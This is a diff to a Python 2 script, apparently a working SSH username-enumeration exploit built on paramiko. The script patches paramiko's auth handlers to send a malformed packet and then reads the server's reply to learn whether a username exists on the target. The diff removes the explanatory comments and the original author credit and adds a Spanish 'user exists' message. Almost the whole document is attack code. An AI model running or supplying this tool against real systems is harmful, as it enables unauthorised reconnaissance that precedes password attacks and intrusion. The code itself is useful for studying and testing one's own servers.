@@ -4,35 +4,28 @@
 
 import argparse, logging, paramiko, socket, sys, os, warnings
 
-# comment this out for debugging purposes
 if not sys.warnoptions:
     warnings.simplefilter("ignore")
 
 class InvalidUsername(Exception):
     pass
 
-# malicious function to malform packet
 def add_boolean(*args, **kwargs):
     pass
 
-# function that'll be overwritten to malform the packet
 old_service_accept = paramiko.auth_handler.AuthHandler._client_handler_table[
         paramiko.common.MSG_SERVICE_ACCEPT]
 
-# malicious function to overwrite MSG_SERVICE_ACCEPT handler
 def service_accept(*args, **kwargs):
     paramiko.message.Message.add_boolean = add_boolean
     return old_service_accept(*args, **kwargs)
 
-# call when username was invalid 
 def invalid_username(*args, **kwargs):
     raise InvalidUsername()
 
-# assign functions to respective handlers
 paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = service_accept
 paramiko.auth_handler.AuthHandler._client_handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = invalid_username
 
-# perform authentication with malicious packet and username
 def check_user(username):
     sock = socket.socket()
     sock.connect((args.target, int(args.port)))
@@ -47,15 +40,14 @@ def check_user(username):
     try:
         transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
     except InvalidUsername:
-        print "[-] " + args.target + ":" + args.port + ": {} is an invalid username".format(username)
+        print ""
         sys.exit(3)
     except paramiko.ssh_exception.AuthenticationException:
-        print "[+] " + args.target + ":" + args.port + ": {} is a valid username".format(username)
+        print "" + args.target + ":" + args.port + " Existe este usuario !!!".format(username)
 
-# remove paramiko logging
 logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())
 
-parser = argparse.ArgumentParser(description='SSH User Enumeration by Leap Security (@LeapSecurity)')
+parser = argparse.ArgumentParser(description='SSH User Enumeration')
 parser.add_argument('target', help="IP address of the target system")
 parser.add_argument('-p', '--port', help="Set port of SSH service")
 parser.add_argument('username', help="Username to check for validity.")
